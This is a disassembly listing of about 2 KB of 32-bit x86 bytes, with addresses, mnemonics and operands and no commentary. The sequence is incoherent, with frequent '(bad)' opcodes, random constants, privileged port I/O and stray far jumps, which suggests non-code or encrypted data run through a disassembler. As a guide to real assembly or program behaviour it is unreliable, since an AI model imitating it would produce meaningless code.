  5266a3:	mov    esp,0xb64af6d4
  5266a8:	rol    DWORD PTR ds:0xb023c9cc,1
  5266ae:	shl    DWORD PTR [ebx-0x7c],cl
  5266b1:	imul   edx,DWORD PTR [esi],0x81c7be11
  5266b7:	lea    esi,[eax]
  5266b9:	mul    DWORD PTR [ebp+0x42]
  5266bc:	lods   eax,DWORD PTR ds:[esi]
  5266bd:	cmp    ebp,DWORD PTR es:[edi]
  5266c0:	shl    DWORD PTR [ecx+0xd],0x35
  5266c4:	add    ecx,DWORD PTR [ecx-0x3c5a9e21]
  5266ca:	bound  esi,QWORD PTR [edx+ebx*2+0x5b1513e2]
  5266d1:	add    esp,ebp
  5266d3:	ret    0x92d2
  5266d6:	cwde   
  5266d7:	mov    ss,ebp
  5266d9:	or     BYTE PTR [di+0xc14],cl
  5266de:	jp     0x5266fc
  5266e0:	mov    ebx,eax
  5266e2:	test   BYTE PTR [ecx+0x1c226ba8],bh
  5266e8:	push   0xffffffc0
  5266ea:	inc    esi
  5266eb:	jmp    0x52671a
  5266ed:	cmp    eax,0x7b06d9a6
  5266f2:	jecxz  0x5266eb
  5266f4:	imul   esp,ebp,0xa08a6ec4
  5266fa:	out    0x83,eax
  5266fc:	inc    esi
  5266fd:	sahf   
  5266fe:	das    
  5266ff:	lahf   
  526700:	or     BYTE PTR [ebx+0x543a96e6],al
  526706:	xchg   esp,ecx
  526708:	mov    bl,0x24
  52670a:	stos   DWORD PTR es:[edi],eax
  52670b:	mov    ecx,0x415d6b74
  526710:	es popf 
  526712:	retf   0x5666
  526715:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  526717:	sub    al,0x7
  52671a:	popa   
  52671b:	(bad)  
  52671c:	loopne 0x5266ea
  52671e:	jne    0x5266b4
  526720:	and    BYTE PTR [edx-0xf3b67ca],0xa
  526727:	scas   eax,DWORD PTR es:[edi]
  526728:	in     eax,0xb4
  52672a:	je     0x5266e0
  52672c:	adc    BYTE PTR [eax-0x77],bl
  52672f:	std    
  526730:	ins    BYTE PTR es:[edi],dx
  526731:	imul   esi,DWORD PTR [ebp+0x74339a73],0x67cf9af8
  52673b:	fadd   QWORD PTR [edi]
  52673d:	sbb    eax,0xace140ec
  526742:	add    ebp,DWORD PTR [eax+0x1e]
  526745:	jg     0x526790
  526747:	(bad)  
  526748:	fs jae 0x519d9b7e
  52674f:	push   es
  526750:	out    dx,eax
  526751:	mov    ah,BYTE PTR [ebx+0x5a]
  526754:	dec    esp
  526755:	inc    esi
  526756:	div    BYTE PTR [ebp+0x56df5cc1]
  52675c:	test   DWORD PTR [ebx+edi*8],ebp
  52675f:	xor    esi,DWORD PTR [edi]
  526761:	popa   
  526762:	xchg   ebx,eax
  526763:	dec    eax
  526764:	test   BYTE PTR [esp+edx*2-0x486b4173],bh
  52676b:	cs fcomip st,st(7)
  52676e:	enter  0xde44,0x8e
  526772:	push   eax
  526773:	inc    ecx
  526774:	and    ebp,ebp
  526776:	aam    0x85
  526778:	inc    ebp
  526779:	inc    edx
  52677a:	xor    ah,BYTE PTR [esi]
  52677c:	cs pop esi
  52677e:	test   BYTE PTR [esi+0x5033fe9e],dh
  526784:	test   BYTE PTR [edx+0x1c244f09],dh
  52678a:	nop
  52678b:	mov    eax,ds:0x6ec894cf
  526790:	inc    edx
  526791:	shl    DWORD PTR [edi-0x40],1
  526794:	cmp    dl,BYTE PTR [eax+0x1388b2aa]
  52679a:	ja     0x52680f
  52679c:	inc    ebp
  52679d:	in     al,0xd0
  52679f:	fld    TBYTE PTR [ecx+0x7d]
  5267a2:	and    ebp,0x1e
  5267a5:	sbb    al,0x6c
  5267a7:	push   ebp
  5267a8:	cmp    ebp,DWORD PTR [esi+0x62f95485]
  5267ae:	and    eax,0x4e8c5fdc
  5267b3:	shl    dh,0xa3
  5267b6:	lods   eax,DWORD PTR ds:[esi]
  5267b7:	js     0x526783
  5267b9:	dec    esi
  5267ba:	dec    ebp
  5267bc:	daa    
  5267bd:	lods   eax,DWORD PTR ds:[esi]
  5267be:	shr    BYTE PTR [edx],cl
  5267c0:	sbb    ebx,DWORD PTR [ebx+0x545b681c]
  5267c6:	imul   edi,DWORD PTR [esi+0x55],0xfffffffa
  5267ca:	add    ah,ch
  5267cc:	jge    0x5267fa
  5267ce:	cwde   
  5267cf:	shl    bl,0x6
  5267d2:	sub    ebp,DWORD PTR [ecx+0x6e]
  5267d5:	xchg   esp,edi
  5267d7:	scas   eax,DWORD PTR es:[edi]
  5267d8:	mov    edi,0xcea86521
  5267dd:	adc    eax,0x2b576eea
  5267e2:	std    
  5267e3:	dec    ebp
  5267e4:	sbb    eax,0xda8b8116
  5267e9:	jp     0x5267df
  5267eb:	out    dx,al
  5267ec:	ins    BYTE PTR es:[edi],dx
  5267ed:	stc    
  5267ee:	xchg   BYTE PTR [edi],al
  5267f0:	mov    ebx,0x2c6a939a
  5267f5:	rol    DWORD PTR [ecx+0x654c4f4f],cl
  5267fb:	dec    ecx
  5267fc:	add    DWORD PTR fs:[edi],edx
  5267ff:	sbb    DWORD PTR ss:[edx+0x4],edx
  526803:	dec    eax
  526804:	mov    dh,0x26
  526806:	retf   
  526807:	mov    bh,BYTE PTR [esi+0x7598882d]
  52680d:	aaa    
  52680e:	call   0x73f9839
  526813:	test   DWORD PTR [ebx+eiz*1+0x7a],0xe5bec1e6
  52681b:	fadd   DWORD PTR [esp+ebp*8+0x25df4f6e]
  526822:	inc    edi
  526823:	lock and BYTE PTR [ebx+0x2f4d0d8],0x34
  52682b:	adc    al,0xe4
  52682d:	push   ebp
  52682e:	(bad)  
  52682f:	out    dx,al
  526830:	popf   
  526831:	cmc    
  526832:	push   0xe
  526834:	fidivr WORD PTR [esi-0x438c7145]
  52683a:	jge    0x526834
  52683c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52683d:	or     bl,BYTE PTR [esi]
  52683f:	jle    0x52684a
  526841:	pop    ss
  526842:	sub    DWORD PTR cs:[edi+edi*4+0x1d15ae95],ecx
  52684a:	psrlq  mm7,mm4
  52684d:	outs   dx,BYTE PTR ds:[esi]
  52684e:	sub    al,0x78
  526850:	inc    ebx
  526851:	sar    BYTE PTR fs:[ebp-0x21],0x1d
  526856:	js     0x5267de
  526858:	je     0x52687c
  52685a:	inc    edx
  52685b:	in     eax,dx
  52685c:	aaa    
  52685d:	push   es
  52685e:	pop    eax
  52685f:	imul   eax,DWORD PTR [esi-0x10839b11],0xc982a4bb
  526869:	sub    al,0x69
  52686b:	cmp    dh,BYTE PTR [ecx-0x9fa4348]
  526871:	jle    0x526878
  526873:	data16 cmp BYTE PTR [ecx-0x56],al
  526877:	mov    ds:0x96e97e0a,al
  52687c:	ins    BYTE PTR es:[edi],dx
  52687d:	sub    bl,dh
  52687f:	aas    
  526880:	out    dx,eax
  526881:	gs out dx,al
  526883:	pop    es
  526884:	neg    edi
  526886:	sbb    al,0x61
  526888:	(bad)  
  526889:	retf   
  52688a:	retf   0x1a64
  52688d:	dec    ecx
  52688e:	icebp  
  52688f:	xor    dh,BYTE PTR [edx]
  526891:	loop   0x5268a3
  526893:	jecxz  0x52681f
  526895:	(bad)  
  526896:	retf   
  526897:	or     edi,DWORD PTR [edx-0x3c83b576]
  52689d:	test   al,0xc7
  52689f:	jmp    0x52688b
  5268a1:	xor    DWORD PTR [esi+0x348f0b54],ebx
  5268a7:	jbe    0x526845
  5268a9:	pop    ecx
  5268aa:	loope  0x5268c5
  5268ac:	or     dl,bl
  5268ae:	mov    al,0x15
  5268b0:	push   ecx
  5268b1:	test   DWORD PTR [ebx-0x44],ebp
  5268b4:	xchg   edx,eax
  5268b5:	xchg   edi,eax
  5268b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5268b7:	pop    ss
  5268b8:	mov    ecx,DWORD PTR [edi]
  5268ba:	sahf   
  5268bb:	xchg   esi,eax
  5268bc:	sub    ecx,DWORD PTR [ecx]
  5268be:	fwait
  5268bf:	lods   eax,DWORD PTR ds:[esi]
  5268c0:	inc    ebp
  5268c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5268c2:	loop   0x526909
  5268c4:	or     BYTE PTR [ebx],ah
  5268c6:	inc    edx
  5268c7:	sbb    DWORD PTR [ecx-0x24f94912],esp
  5268cd:	inc    ebp
  5268ce:	lea    ebx,[ebx+0x35]
  5268d1:	hlt    
  5268d2:	xchg   esi,eax
  5268d3:	lods   al,BYTE PTR ds:[esi]
  5268d4:	jl     0x526938
  5268d6:	loopne 0x5268b4
  5268d8:	add    ebp,DWORD PTR [edx-0x2b85b97e]
  5268de:	and    DWORD PTR [ebx+0x32c81804],edx
  5268e4:	inc    ecx
  5268e5:	dec    ecx
  5268e6:	stc    
  5268e7:	aaa    
  5268e8:	xor    cl,BYTE PTR [ecx+esi*2+0x33a29762]
  5268ef:	out    dx,eax
  5268f0:	sub    ebx,DWORD PTR [edx-0x1f84c067]
  5268f6:	add    cl,0x14
  5268f9:	mov    esi,0x527ecbf8
  5268fe:	js     0x52690b
  526900:	jmp    0x339c:0x8e5acd43
  526907:	xchg   esp,eax
  526908:	add    BYTE PTR [edx-0x6b281441],ah
  52690e:	xor    al,0xd3
  526910:	ffreep st(7)
  526912:	mov    dl,ch
  526914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  526915:	popf   
  526916:	das    
  526917:	sub    bl,bh
  526919:	in     al,dx
  52691a:	or     eax,ecx
  52691c:	mov    ds,WORD PTR [eiz*1+0x26017c0b]
  526923:	push   cs
  526924:	add    al,0xd8
  526926:	sub    BYTE PTR ds:0x650a0d99,bl
  52692c:	mov    edi,0xc2e211a3
  526931:	pushf  
  526932:	(bad)  
  526933:	std    
  526934:	popf   
  526935:	or     BYTE PTR [ecx-0x70],cl
  526938:	mov    ds:0x10820046,al
  52693d:	cdq    
  52693e:	mov    bl,0x3
  526940:	add    bh,dh
  526942:	ret    0x8c63
  526945:	sbb    eax,0xf20e7b6c
  52694a:	add    eax,DWORD PTR [esi-0x48392940]
  526950:	shl    DWORD PTR ds:0xe13c8870,cl
  526956:	rcl    esp,0xf5
  526959:	xchg   edx,eax
  52695a:	fdivr  DWORD PTR [ecx]
  52695c:	adc    al,0x7f
  52695e:	xlat   BYTE PTR ds:[ebx]
  52695f:	les    esp,FWORD PTR [ebx+ecx*2]
  526962:	adc    cl,ch
  526964:	icebp  
  526965:	sub    eax,0x822652b9
  52696a:	push   edx
  52696b:	(bad)  
  52696c:	sti    
  52696d:	pop    edi
  52696e:	jne    0x52694a
  526970:	popa   
  526971:	pop    ebp
  526972:	das    
  526973:	sbb    DWORD PTR [eax+0x2],edi
  526976:	(bad)  
  526977:	cmp    ebx,ecx
  526979:	mov    edx,ebx
  52697b:	sbb    al,BYTE PTR [edx+0x19b44baf]
  526981:	lea    edx,[ecx-0x6d]
  526984:	(bad)  
  526985:	lods   al,BYTE PTR ds:[esi]
  526986:	push   ss
  526987:	sbb    BYTE PTR [edi],ah
  526989:	inc    edx
  52698a:	sub    al,0x3d
  52698c:	sbb    BYTE PTR [ebx+ecx*1],0xc9
  526990:	jmp    0x52695a
  526992:	add    al,BYTE PTR [esi+0x16]
  526995:	(bad)  
  526996:	test   al,0x3a
  526998:	rcr    edi,0x5c
  52699b:	rcl    BYTE PTR [eax+0x77],1
  52699e:	mov    eax,ebx
  5269a0:	sub    DWORD PTR [ebx],esp
  5269a2:	cmp    edx,edx
  5269a4:	outs   dx,DWORD PTR ds:[esi]
  5269a5:	cmp    DWORD PTR [ecx-0xd3ed5d7],0xa
  5269ac:	mov    ds:0x6bda86ed,eax
  5269b1:	iret   
  5269b2:	dec    edx
  5269b3:	xchg   esi,eax
  5269b4:	xor    edi,DWORD PTR [ebx+0x1b]
  5269b7:	repnz push ss
  5269b9:	adc    ecx,ebx
  5269bb:	push   es
  5269bc:	ds in  eax,dx
  5269be:	jle    0x52699c
  5269c0:	jl     0x526a07
  5269c2:	push   cs
  5269c3:	cmp    esi,DWORD PTR [edx+0x67]
  5269c6:	sub    BYTE PTR [edx-0x6],0xcb
  5269ca:	outs   dx,BYTE PTR ds:[esi]
  5269cb:	loope  0x526958
  5269cd:	push   ss
  5269ce:	retf   
  5269cf:	jmp    0x526a31
  5269d1:	popf   
  5269d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5269d3:	adc    al,0xc4
  5269d5:	leave  
  5269d6:	cmp    ah,dh
  5269d8:	test   BYTE PTR [ecx+0x67],dl
  5269db:	mov    DWORD PTR [edi-0x47666c01],0x6964aa43
  5269e5:	mov    BYTE PTR [esi-0x48],bh
  5269e8:	pop    esp
  5269e9:	into   
  5269ea:	pop    edx
  5269eb:	adc    BYTE PTR [ebp-0x1c],bh
  5269ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5269ef:	popa   
  5269f0:	aad    0x8f
  5269f2:	push   edi
  5269f3:	xchg   esp,eax
  5269f4:	pop    ds
  5269f5:	or     dh,dl
  5269f7:	pop    es
  5269f8:	jmp    0xdc2a:0xd6701059
  5269ff:	add    BYTE PTR [esi],dl
  526a01:	xchg   BYTE PTR [esi+0x53fcde0],al
  526a07:	mov    esp,DWORD PTR [ebp+0x38]
  526a0a:	cmp    al,0xe4
  526a0c:	addr16 jmp 0x5269ae
  526a0f:	ins    BYTE PTR es:[edi],dx
  526a10:	aas    
  526a11:	popf   
  526a12:	cmp    eax,0xd9a47564
  526a17:	ret    0x705a
  526a1a:	sbb    al,BYTE PTR [edi+0xe057b9e]
  526a20:	sbb    al,0xac
  526a22:	imul   DWORD PTR [ebp-0x2fa3ab75]
  526a28:	push   ebx
  526a29:	js     0x5269b5
  526a2b:	int3   
  526a2c:	dec    edi
  526a2d:	cmp    eax,esp
  526a2f:	and    al,0xa1
  526a31:	or     esp,DWORD PTR [eax]
  526a33:	mov    dh,0xba
  526a36:	push   ebx
  526a37:	mov    ebp,0xab34e221
  526a3c:	pop    eax
  526a3d:	xor    BYTE PTR [edi+eax*4-0x76],0xdc
  526a42:	pop    eax
  526a43:	cmp    bh,BYTE PTR [ebx]
  526a45:	aad    0x9f
  526a47:	mul    DWORD PTR [ebp+0x1a608bfb]
  526a4d:	dec    edi
  526a4e:	adc    BYTE PTR [esi+0x371b3393],ch
  526a54:	and    eax,esp
  526a56:	sbb    ah,bh
  526a58:	fisub  WORD PTR [bx+si]
  526a5b:	(bad)  
  526a5c:	sar    DWORD PTR [edi+esi*4],cl
  526a5f:	mov    eax,ds:0xfede29e5
  526a64:	imul   esi,edx,0xc
  526a67:	out    0x21,eax
  526a69:	push   esp
  526a6a:	mov    dl,0xb9
  526a6c:	mov    bl,0x83
  526a6e:	push   ebp
  526a6f:	aaa    
  526a70:	push   esp
  526a71:	sbb    BYTE PTR [ecx-0x56],ch
  526a74:	adc    edx,DWORD PTR [eax-0x3c]
  526a77:	jmp    0x526a9e
  526a79:	add    DWORD PTR [esp+edi*8-0x1446d4c8],0x2b126f93
  526a84:	sub    ch,BYTE PTR [ebp+0x7445243f]
  526a8a:	dec    esp
  526a8b:	sahf   
  526a8c:	out    0x64,eax
  526a8e:	inc    edx
  526a8f:	rcl    BYTE PTR [edi+0x20],cl
  526a92:	push   es
  526a93:	ins    BYTE PTR es:[edi],dx
  526a94:	sbb    eax,0x5e2521e9
  526a99:	cli    
  526a9a:	enter  0xac55,0xa3
  526a9e:	xchg   esi,eax
  526a9f:	and    eax,0xf609f0fe
  526aa4:	jp     0x526b05
  526aa6:	aam    0xc0
  526aa8:	push   0xffffff9d
  526aaa:	pop    ecx
  526aab:	jmp    0x526a2d
  526aad:	or     ah,BYTE PTR [edx+eiz*2-0x13d39247]
  526ab4:	sbb    dl,BYTE PTR [edi-0x77279f44]
  526aba:	popf   
  526abb:	outs   dx,BYTE PTR ds:[esi]
  526abc:	lods   eax,DWORD PTR ds:[esi]
  526abd:	mov    cl,0xf9
  526abf:	cwde   
  526ac0:	daa    
  526ac1:	xchg   ebp,eax
  526ac2:	in     al,0x9b
  526ac4:	mov    eax,ds:0xe9e56d5
  526ac9:	(bad)  
  526aca:	push   eax
  526acb:	push   ebp
  526acc:	test   eax,0x87f321c6
  526ad1:	scas   eax,DWORD PTR es:[edi]
  526ad2:	in     al,0xab
  526ad4:	mov    ch,0x80
  526ad6:	enter  0x3519,0xd
  526ada:	dec    ecx
  526adb:	rcr    DWORD PTR [ebp-0x3e],1
  526ade:	cmp    BYTE PTR [edx+0x1b4e52e7],al
  526ae4:	(bad)  
  526ae5:	sti    
  526ae6:	sbb    DWORD PTR ds:0x89843b69,eax
  526aec:	pop    eax
  526aed:	push   ebx
  526aee:	bound  ebx,QWORD PTR [eax+0x37236042]
  526af4:	inc    ebx
  526af5:	sar    dl,cl
  526af7:	jo     0x526b36
  526af9:	sti    
  526afa:	mov    bl,dl
  526afc:	cs jae 0x526ab3
  526aff:	sbb    al,0x69
  526b01:	sbb    bh,bl
  526b03:	retf   
  526b04:	enter  0x79d9,0x70
  526b08:	ins    DWORD PTR es:[edi],dx
  526b09:	fsubr  DWORD PTR [ecx-0x6c]
  526b0c:	sub    al,0x61
  526b0e:	jecxz  0x526aee
  526b10:	sub    DWORD PTR [ebx],0x26
  526b13:	dec    esi
  526b14:	cmc    
  526b15:	xor    al,0x54
  526b17:	or     DWORD PTR [edi+0x5c54bedc],ebx
  526b1d:	inc    edx
  526b1e:	mov    dl,0xc6
  526b20:	(bad)  
  526b21:	fimul  WORD PTR [edi]
  526b23:	inc    ebx
  526b24:	mov    al,0xef
  526b26:	and    al,0xb4
  526b28:	(bad)  
  526b29:	bound  ebp,QWORD PTR [esi-0x4d]
  526b2c:	mov    ah,0xd0
  526b2e:	mov    eax,ds:0x429239db
  526b33:	je     0x526b94
  526b35:	mov    eax,ds:0x49f275ce
  526b3a:	fimul  DWORD PTR [edi+edx*8+0x732c4778]
  526b41:	ja     0x526b78
  526b43:	addr16 sub eax,0xc3bf3fb5
  526b49:	mov    ebp,DWORD PTR [ebp-0x4d]
  526b4c:	pop    edx
  526b4d:	repz inc ebx
  526b4f:	and    eax,DWORD PTR [edi-0x512a7e9e]
  526b55:	stos   BYTE PTR es:[edi],al
  526b56:	add    eax,0x85dbcb69
  526b5b:	out    dx,eax
  526b5c:	(bad)  
  526b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  526b5e:	fidiv  DWORD PTR [edx+0x4]
  526b61:	fs cdq 
  526b63:	dec    ebp
  526b64:	and    eax,0xc56ac9fd
  526b69:	fdiv   QWORD PTR [edi]
  526b6b:	ja     0x526b7e
  526b6d:	cmp    ecx,edi
  526b6f:	and    DWORD PTR [ebp+0x5a],edi
  526b72:	pop    edi
  526b73:	dec    ebx
  526b74:	cli    
  526b75:	cmp    DWORD PTR [edx+0x4a],edx
  526b78:	test   DWORD PTR ds:0x2299af8c,ecx
  526b7e:	popa   
  526b7f:	and    ah,BYTE PTR ds:0xb094db02
  526b85:	jne    0x526bf1
  526b87:	sub    al,0xf2
  526b89:	sub    DWORD PTR ds:0xf979e18c,ecx
  526b8f:	pushf  
  526b90:	mov    ch,0x17
  526b92:	mov    BYTE PTR [esi-0x38],bh
  526b95:	ret    
  526b96:	xchg   edi,eax
  526b97:	cmp    eax,0xf01646ce
  526b9c:	or     esi,DWORD PTR [eax+0x29]
  526b9f:	jb     0x526b30
  526ba1:	into   
  526ba2:	sbb    al,0x93
  526ba4:	xor    bl,dh
  526ba6:	xor    eax,0x4466260b
  526bab:	retf   
  526bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  526bad:	xchg   esi,eax
  526bae:	faddp  st(4),st
  526bb0:	fisubr WORD PTR [ecx-0x71cbb2ff]
  526bb6:	jmp    0xdc4a9554
  526bbb:	fimul  DWORD PTR [edx-0x5]
  526bbe:	sub    DWORD PTR [ecx],edx
  526bc0:	les    ecx,FWORD PTR [ecx+0xde921b3]
  526bc6:	ins    BYTE PTR es:[edi],dx
  526bc7:	jecxz  0x526ba1
  526bc9:	es and dh,al
  526bcc:	fbstp  TBYTE PTR [ecx]
  526bce:	mov    edi,ebp
  526bd0:	frstor [edx]
  526bd2:	(bad)  
  526bd3:	mov    cs,WORD PTR [edx-0x3f134525]
  526bd9:	ins    DWORD PTR es:[edi],dx
  526bda:	ror    DWORD PTR [edx],cl
  526bdc:	push   ds
  526bdd:	fsub   DWORD PTR [ecx+edx*1-0x3b]
  526be1:	cld    
  526be2:	das    
  526be3:	ins    BYTE PTR es:[edi],dx
  526be4:	sub    DWORD PTR [eax],0xf991f277
  526bea:	sbb    BYTE PTR [esi+0x16],0x8e
  526bee:	js     0x526c5c
  526bf0:	stos   DWORD PTR es:[edi],eax
  526bf1:	repz cmp DWORD PTR ds:0x87ff8e9f,ebp
  526bf8:	mov    edx,0x19533dc1
  526bfd:	mov    esp,DWORD PTR [edx+eax*1+0x2a]
  526c01:	(bad)  
  526c02:	retf   0x530e
  526c05:	lods   al,BYTE PTR ds:[esi]
  526c06:	or     edi,esi
  526c08:	into   
  526c09:	xor    eax,DWORD PTR [edi]
  526c0b:	mov    ebp,0x68f9a43a
  526c10:	or     al,0x88
  526c12:	xchg   esi,eax
  526c13:	cmovb  eax,DWORD PTR [ecx]
  526c16:	mov    edi,0x67ede860
  526c1b:	xor    eax,0x37c8dbd3
  526c20:	pop    ds
  526c21:	(bad)  
  526c22:	scas   eax,DWORD PTR es:[edi]
  526c23:	mov    DWORD PTR [ecx],edi
  526c25:	popa   
  526c26:	add    bh,BYTE PTR [esp+esi*8-0x37e1c7ff]
  526c2d:	or     al,0x8e
  526c2f:	icebp  
  526c30:	mov    edx,0x95c9cbc
  526c35:	popa   
  526c36:	mov    esi,0x884376
  526c3b:	outs   dx,BYTE PTR ds:[esi]
  526c3c:	mov    edi,cs
  526c3e:	mov    ecx,0x4ff7cffb
  526c43:	sbb    ch,BYTE PTR [esi-0x5f]
  526c46:	je     0x526bf5
  526c48:	outs   dx,DWORD PTR ds:[esi]
  526c49:	pop    ds
  526c4a:	lds    eax,FWORD PTR [ebx+ebp*4]
  526c4d:	test   al,0x36
  526c4f:	imul   DWORD PTR [edx]
  526c51:	add    DWORD PTR [ebx],ebx
  526c53:	xchg   BYTE PTR [esi-0x486c0bd0],bl
  526c59:	idiv   BYTE PTR [edx+0x15]
  526c5c:	mov    dh,0xd2
  526c5e:	pop    es
  526c5f:	jno    0x526c26
  526c61:	sub    eax,0xde06205b
  526c66:	pop    edx
  526c67:	adc    al,0xa7
  526c69:	rcl    ebp,1
  526c6b:	add    ebp,ecx
  526c6d:	mov    cl,0x3f
  526c6f:	outs   dx,BYTE PTR ds:[esi]
  526c70:	mov    WORD PTR [ecx+0x4c6d20f3],cs
  526c76:	dec    eax
  526c77:	int3   
  526c78:	daa    
  526c79:	push   esp
  526c7a:	xchg   edx,eax
  526c7b:	int    0x8e
  526c7d:	and    esi,DWORD PTR [ebx-0x57]
  526c80:	mov    esp,0xbd7ce9ef
  526c85:	push   ecx
  526c86:	dec    eax
  526c87:	ss mov edx,0xbb6dd28b
  526c8d:	out    dx,eax
  526c8e:	jb     0x526cb9
  526c90:	inc    ebx
  526c91:	ins    DWORD PTR es:[edi],dx
  526c92:	jp     0x526d08
  526c94:	sub    DWORD PTR [edi],edx
  526c96:	stos   BYTE PTR es:[edi],al
  526c97:	push   esp
  526c98:	and    BYTE PTR [esp+ecx*1-0x7],cl
  526c9c:	sbb    eax,0x2258dbf1
  526ca1:	repz xor ecx,DWORD PTR [ebx-0x4b]
  526ca5:	mov    WORD PTR [ebx-0x38776bd8],es
  526cab:	dec    eax
  526cac:	pop    eax
  526cad:	xor    BYTE PTR ds:0xbac21a67,cl
  526cb3:	mov    bl,0x48
  526cb5:	mov    eax,0xedbcf6df
  526cba:	mov    esp,0x913dbffc
  526cbf:	loop   0x526ca1
  526cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  526cc2:	dec    ecx
  526cc3:	cs mov bh,0x25
  526cc6:	mov    eax,ds:0xc8d01b2e
  526ccb:	push   edx
  526ccc:	je     0x526cba
  526cce:	(bad)  
  526ccf:	jecxz  0x526ce8
  526cd1:	in     eax,0xa8
  526cd3:	mov    edi,0xb32d741f
  526cd8:	(bad)  
  526cd9:	pop    ebx
  526cda:	inc    esp
  526cdb:	xor    eax,0x7a0293f
  526ce0:	les    ebx,FWORD PTR [ecx-0x1ae7c5bc]
  526ce6:	or     eax,0x6c962bb3
  526ceb:	stos   DWORD PTR es:[edi],eax
  526cec:	pusha  
  526ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  526cee:	mov    dh,0x99
  526cf0:	idiv   DWORD PTR [edx]
  526cf2:	ins    DWORD PTR es:[edi],dx
  526cf3:	xchg   edx,eax
  526cf4:	sbb    al,0x86
  526cf6:	pop    esp
  526cf7:	fild   WORD PTR [ebp-0x8763f01]
  526cfd:	cdq    
  526cfe:	xchg   esi,eax
  526cff:	mov    gs,edx
  526d01:	call   FWORD PTR [edi-0x53]
  526d04:	sub    DWORD PTR [edi-0x4c],ebx
  526d07:	fist   DWORD PTR [edx+0x60798dc0]
  526d0d:	int3   
  526d0e:	mov    ds:0xa233717c,al
  526d13:	adc    BYTE PTR [edi+esi*1-0x77],dh
  526d17:	loop   0x526d19
  526d19:	hlt    
  526d1a:	push   esp
  526d1b:	arpl   WORD PTR [ebp+0x51a1169c],bx
  526d21:	push   ss
  526d22:	or     BYTE PTR [esi+0x5a],bl
  526d25:	mov    ah,bl
  526d27:	pop    ebp
  526d28:	loop   0x526d14
  526d2a:	das    
  526d2b:	jmp    0x526cc1
  526d2d:	(bad)  
  526d2e:	inc    edx
  526d2f:	pop    edx
  526d30:	lock out 0xdb,eax
  526d33:	mov    fs,eax
  526d35:	cmp    DWORD PTR [ebx+edi*4],ebp
  526d38:	add    eax,0x14082ea8
  526d3d:	les    esi,FWORD PTR [ecx+0x7feca7bb]
  526d43:	or     cl,BYTE PTR [ebx-0x7b]
  526d46:	mov    edx,0x2cb6b379
  526d4b:	nop
  526d4c:	ror    BYTE PTR [eax+0x41aa1c0d],cl
  526d52:	imul   ecx,esp,0x71b76cab
  526d58:	xchg   edi,eax
  526d59:	cld    
  526d5a:	pop    esi
  526d5b:	jnp    0x526dd7
  526d5d:	or     BYTE PTR [eax+ebx*1],bl
  526d60:	add    BYTE PTR [esi+0x13399165],ah
  526d66:	ret    
  526d67:	xchg   esp,eax
  526d68:	hlt    
  526d69:	pop    esi
  526d6a:	loop   0x526db5
  526d6c:	push   ds
  526d6d:	mov    cl,0x87
  526d6f:	or     BYTE PTR [edi+0x77f1c2b5],0x4e
  526d76:	mov    gs,WORD PTR fs:[edi-0x1c]
  526d7a:	mov    ds:0xb174a81e,eax
  526d7f:	pushf  
  526d80:	enter  0xe4e3,0x31
  526d84:	cli    
  526d85:	push   es
  526d86:	leave  
  526d87:	pop    edi
  526d88:	mov    edi,0x7cae9a43
  526d8d:	iret   
  526d8e:	xor    bh,BYTE PTR ds:0xa56750d6
  526d94:	xchg   DWORD PTR [edi+eax*4],edi
  526d97:	or     al,ch
  526d99:	aaa    
  526d9a:	ret    0xbe26
  526d9d:	fstp   DWORD PTR [ebp+0x2d]
  526da0:	std    
  526da1:	or     ch,BYTE PTR [ebx-0x19d503ce]
  526da7:	leave  
  526da8:	and    dh,cl
  526daa:	arpl   WORD PTR [ecx+0x11cff219],dx
  526db0:	and    DWORD PTR ds:0xb66aea48,ebp
  526db6:	pop    edi
  526db7:	std    
  526db8:	cmp    al,0xc4
  526dba:	mov    bh,0xe2
  526dbc:	repnz ror DWORD PTR [edi+0x51],0xf
  526dc1:	fstp   st(0)
  526dc3:	repz mov gs,WORD PTR [edx+0x4f]
  526dc7:	sbb    ecx,esp
  526dc9:	fisubr WORD PTR [ebx]
  526dcb:	pop    esi
  526dcc:	xchg   BYTE PTR [eax+0xd9ebaae],bh
  526dd2:	mov    bl,BYTE PTR [ecx-0x40c29d63]
  526dd8:	pop    ds
  526dd9:	mov    ds:0x96246f73,al
  526dde:	int3   
  526ddf:	sbb    bl,BYTE PTR [esi*2-0x303ae8b]
  526de6:	daa    
  526de7:	xor    al,0x5a
  526de9:	stos   BYTE PTR es:[edi],al
  526dea:	mov    ch,0xbf
  526dec:	ins    DWORD PTR es:[edi],dx
  526ded:	add    dl,ah
  526def:	fidiv  DWORD PTR [eax-0x4e]
  526df2:	aaa    
  526df3:	iret   
  526df4:	cmp    DWORD PTR [ebx],edx
  526df6:	dec    ebp
  526df7:	in     eax,0xb6
  526df9:	into   
  526dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  526dfb:	mov    ds:0x33f23a1c,eax
  526e00:	mul    DWORD PTR [ecx+0x265ed368]
  526e06:	cmp    eax,0x6da4b613
  526e0b:	mov    esi,0xe50ef5fe
  526e10:	fucomp st(3)
  526e12:	mov    ecx,0x69542578
  526e17:	sub    al,0x1f
  526e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  526e1b:	and    BYTE PTR [esi-0x2f],ah
  526e1e:	or     ebp,DWORD PTR [eax]
  526e20:	push   eax
  526e21:	dec    edx
  526e22:	lods   eax,DWORD PTR ds:[esi]
  526e23:	mov    ds:0x64fb8456,eax
  526e28:	ds mov bl,bh
  526e2b:	sub    ebp,ebx
  526e2d:	dec    esp
  526e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  526e2f:	or     edi,DWORD PTR [ebx]
  526e31:	dec    esi
  526e32:	mov    ah,0xa0
  526e34:	push   edi
  526e35:	lahf   
  526e36:	bound  ebp,QWORD PTR [edx]
  526e38:	scas   al,BYTE PTR es:[edi]
  526e39:	pop    ss
  526e3a:	mov    ecx,0x969312de
